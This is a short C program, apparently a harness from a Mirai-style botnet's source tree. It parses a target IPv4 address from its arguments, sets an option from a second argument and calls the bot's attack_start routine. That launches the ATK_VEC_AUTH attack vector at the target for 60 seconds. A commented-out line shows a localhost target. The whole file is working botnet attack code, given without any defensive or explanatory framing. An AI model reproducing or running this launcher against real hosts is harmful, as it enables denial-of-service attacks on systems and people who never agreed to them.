#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <signal.h>
#include <errno.h>

#include "../bot/includes.h"
#include "../bot/attack.h"
#include "../bot/rand.h"
#include "../bot/util.h"

int main(int argc, char *argv[])
{
    if (argc != 3)
        return 0;
    
    uint8_t o1 = atoi(strtok(argv[1], "."));
    uint8_t o2 = atoi(strtok(NULL, "."));
    uint8_t o3 = atoi(strtok(NULL, "."));
    uint8_t o4 = atoi(strtok(NULL, "."));

    attack_init();
    int duration = 60;
    ATTACK_VECTOR vector = ATK_VEC_AUTH;
    uint8_t targs_len = 1;
    struct attack_target targs;
    targs.addr = INET_ADDR(o1, o2, o3, o4);
    // targs.addr = INET_ADDR(127,0,0,1);
    uint8_t opts_len = 1;
    struct attack_option opts;
    opts.key = 7;
    opts.val = argv[2];
    attack_start(duration, vector, targs_len, &targs, opts_len, &opts);
    while (TRUE)
        ;
    return 0;
}
